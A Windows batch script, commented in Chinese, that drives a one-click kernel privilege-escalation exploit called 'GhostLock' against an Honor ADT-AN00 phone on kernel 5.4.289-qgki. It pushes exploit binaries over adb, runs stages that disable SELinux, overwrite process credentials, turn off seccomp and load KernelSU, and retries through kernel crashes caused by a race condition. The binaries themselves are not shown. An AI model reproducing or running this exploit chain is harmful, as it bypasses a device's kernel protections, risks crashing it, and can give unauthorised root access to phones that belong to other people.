@echo off
chcp 936 >nul
setlocal enabledelayedexpansion
title GhostLock 一键提权 - Honor ADT-AN00 / 5.4.289-qgki

rem ============================================================
rem  双击本文件，全自动完成：W1 关 SELinux -> W2/W3 -> 晚加载 KernelSU
rem  -> 切回 Enforcing -> 验证 su / 模块 / 写盘 / 截图
rem
rem  全程只走 adb（shell 域），手机上不用点任何东西。
rem  shell 域允许 perf_event_open，所以内核基址由二进制自己测，不需要交接。
rem
rem  复核的路径都是包内相对路径，整个文件夹可以随便挪/拷到别的电脑。
rem ============================================================

set "ROOT=%~dp0"
set "D=/data/local/tmp/glpc"
set "ADB="

echo ============================================
echo   GhostLock 一键提权   Honor ADT-AN00
echo ============================================
echo.

rem ---- 1. 找 adb：优先用包里自带的 ----
if exist "%ROOT%platform-tools\adb.exe" set "ADB=%ROOT%platform-tools\adb.exe"
if not defined ADB (
  where adb >nul 2>&1 && set "ADB=adb"
)
if not defined ADB if exist "%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe" set "ADB=%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe"
if not defined ADB if exist "C:/platform-tools/adb.exe" set "ADB=C:/platform-tools/adb.exe"
if not defined ADB (
  echo [x] 找不到 adb.exe。请确认 platform-tools 文件夹和本文件在同一层。
  goto :fail
)
echo [*] adb: %ADB%

rem ---- 2. 设备是否在线 ----
"%ADB%" get-state 2>nul | findstr /c:"device" >nul || (
  echo [x] 没检测到设备。检查 USB 线、手机上点「允许 USB 调试」。
  goto :fail
)
for /l %%i in (1,1,30) do (
  "%ADB%" shell getprop sys.boot_completed 2>nul | findstr /c:"1" >nul && goto :bootok
  ping -n 3 127.0.0.1 >nul
)
echo [x] 设备还没开机完成，稍后再试。
goto :fail

:bootok
for /f "usebackq delims=" %%m in (`"%ADB%" shell getprop ro.product.model 2^>nul`) do set "MODEL=%%m"
for /f "usebackq delims=" %%k in (`"%ADB%" shell uname -r 2^>nul`) do set "KREL=%%k"
for /f "usebackq delims=" %%b in (`"%ADB%" shell cat /proc/sys/kernel/random/boot_id 2^>nul`) do set "BOOT=%%b"
echo [*] 机型=%MODEL%  内核=%KREL%
echo [*] boot=%BOOT%
echo.

rem ---- 3. 机型/内核校验：偏移是按这套内核算的，换了机器不能硬跑 ----
set "MATCH="
echo %MODEL% | findstr /i "ADT-AN00" >nul && echo %KREL% | findstr /i "5.4.289-qgki" >nul && set "MATCH=1"
if not defined MATCH (
  echo.
  echo [!] 机型或内核和这套偏移不匹配。
  echo     本包只对 HONOR ADT-AN00 / 5.4.289-qgki-... 成立。
  echo     别的机器上跑，W1 会写到错误的内核地址，设备会当场重启（甚至更糟）。
  echo.
  if not "%GL_FORCE%"=="1" (
    echo     确实要在这台机器上试，请设置环境变量 GL_FORCE=1 后再运行。
    goto :fail
  )
  echo     [!!] GL_FORCE=1：已跳过校验，风险自负。
)
echo.

rem ---- 4. 推工具链 ----
echo [1/5] 推送工具链
"%ADB%" shell mkdir -p %D% >nul 2>&1
"%ADB%" push "%ROOT%bin\glbin"             %D%/glbin >nul || goto :fail
"%ADB%" push "%ROOT%bin\payload_run.bin"   %D%/payload_run.bin >nul || goto :fail
"%ADB%" push "%ROOT%bin\glpc.sh"           %D%/glpc.sh >nul || goto :fail
"%ADB%" shell chmod 755 %D%/glbin %D%/glpc.sh

rem ---- 5. 主循环：W1 会打空、W2 可能把设备送走，都要能自己重来 ----
set "TRY=0"
:attempt
set /a TRY+=1
if %TRY% GTR 3 goto :fail

"%ADB%" shell su -c id 2>nul | findstr /c:"uid=0" >nul && (
  echo [+] 已经 root，跳过漏洞利用。
  goto :verify
)
echo.
echo ---- 第 %TRY% 轮 / 最多 3 轮 ----

set "BID0="
for /f "usebackq delims=" %%b in (`"%ADB%" shell cat /proc/sys/kernel/random/boot_id 2^>nul`) do set "BID0=%%b"

echo [2/5] W1：关掉 SELinux（最多 3 把）
"%ADB%" shell sh %D%/glpc.sh run1
"%ADB%" shell sh %D%/glpc.sh tail %D%/run1.log 8

echo.
echo [3/5] W2/W3：新进程写 cred + 关 seccomp + 晚加载 KernelSU
echo       这一步有约一半概率触发内核复位，脚本会自动重来。
"%ADB%" shell sh %D%/glpc.sh run2
"%ADB%" shell sh %D%/glpc.sh tail %D%/run2.log 10

echo.
echo [4/5] 等 root
set "OK="
for /l %%i in (1,1,20) do (
  if not defined OK (
    "%ADB%" shell su -c id 2>nul | findstr /c:"uid=0" >nul && set "OK=1"
    if not defined OK ping -n 4 127.0.0.1 >nul
  )
)
if defined OK goto :verify

set "BID1="
for /f "usebackq delims=" %%b in (`"%ADB%" shell cat /proc/sys/kernel/random/boot_id 2^>nul`) do set "BID1=%%b"
if not defined BID1 goto :rebooted
if not "%BID1%"=="%BID0%" goto :rebooted
echo [!] 这一轮没拿到 root（W1 大概打空了），直接重来。
goto :attempt

:rebooted
echo.
echo [!] 设备被内核复位了（W2 的 PI 竞态）。等它开机后自动重来。
call :waitboot
goto :attempt

:waitboot
"%ADB%" wait-for-device >nul 2>&1
for /l %%i in (1,1,120) do (
  "%ADB%" shell getprop sys.boot_completed 2>nul | findstr /c:"1" >nul && goto :eof
  ping -n 4 127.0.0.1 >nul
)
goto :eof

rem ---- 6. 收尾 + 验证 ----
:verify
echo.
echo [5/5] 收尾：SELinux 切回 Enforcing（root 由模块在策略内提供，不再需要 Permissive）
"%ADB%" shell sh %D%/glpc.sh harden

echo.
echo ================= 验证 =================
echo -- su -c id
"%ADB%" shell su -c id
echo -- getenforce
"%ADB%" shell getenforce
echo -- 内核模块
"%ADB%" shell su -c "grep kernelsu /proc/modules"
echo -- root 写盘
"%ADB%" shell sh %D%/glpc.sh proof
echo -- screencap（顺带证明 selinux_state.initialized 没被打掉）
"%ADB%" shell "screencap -p /sdcard/_gl_proof.png && echo screencap-ok"
echo ========================================

echo.
echo [+] 完成。之后常用：adb shell su -c "id"
echo     日志： adb shell cat %D%/run1.log  ^|  run2.log
echo.
if not "%GL_NOPAUSE%"=="1" pause
exit /b 0

:fail
echo.
echo [x] 没成功。看设备上的日志：%D%/run1.log 和 run2.log
echo     车机/手机若已复位，从头再双击一次本文件即可。
if not "%GL_NOPAUSE%"=="1" pause
exit /b 1
